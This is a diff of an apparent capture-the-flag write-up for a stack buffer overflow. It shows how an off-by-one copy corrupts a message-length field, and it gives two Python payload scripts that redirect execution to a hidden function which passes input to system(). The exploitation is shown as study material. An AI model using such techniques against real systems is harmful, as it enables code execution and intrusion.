@@ -1,16 +1,22 @@
 * in this challenge the program asks for a username and msg , than display "msg sent".
 * looking at the assembly with gdb :
-
-
+    - main() calls handle_msg(), this function start by setting a 40 bytes with zeros .
+    - after that it calls set_username with buff parameter, set_username reads the input in a local buffer 128 size.
+    - and start coping 41 at most to memory location (buff + 140) , than it display the msg "welcome [username]"
+    - after returning from set_username(char *ptr), handle_msg() calls set_msg(char *ptr).
+    - in set_msg(), the function stores the msg in msg[1024], than copy ptr+180 characters to its first parameter.
+    - the value at (ptr+180) is set to 140 in handle_msg(), but since we can copy 41 to buffer in set_username()
+    - we can change this value to run a buffer overflow attack. (trigger set_msg() to copy more data, so we can change the return address of handle_msg to a secret function calls secret_backdoor)
+    - secret_backdoor() asks for an input and pass it to system().
 
 
 
 ***************** username ************************
 import struct
 
-padding = "A" * 40
+padding = "A" * 40  # username
 
-msg_len = struct.pack ("B", 0xd0)
+msg_len = struct.pack ("B", 0xd0) # change the length of msg to 208 instead of 140 
 
 print padding + msg_len
 
@@ -22,9 +28,9 @@ import struct
 
 padding = "A" * 200
 
-backdoor = struct.pack ("Q", 0x55555555488c)
+secret_backdoor = struct.pack ("Q", 0x55555555488c) 
 
-print padding + backdoor
+print padding + secret_backdoor
 ****************************************************
 
 
